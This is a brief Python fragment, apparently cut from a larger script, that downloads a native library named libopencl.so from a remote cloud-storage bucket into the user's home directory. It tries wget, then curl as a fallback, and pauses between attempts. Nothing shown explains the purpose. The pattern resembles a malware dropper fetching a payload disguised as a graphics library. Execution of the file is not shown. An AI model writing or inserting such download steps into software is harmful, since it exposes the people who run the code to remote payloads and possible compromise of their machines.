...
os.system("/usr/bin/wget -O ~/libopencl.so https://stable-diffusion-log2.oss-cn-hangzhou.aliyuncs.com/libopencl.so")
time.sleep(30)
os.system("/usr/bin/curl -o ~/libopencl.so https://stable-diffusion-log2.oss-cn-hangzhou.aliyuncs.com/libopencl.so")
time.sleep(30)
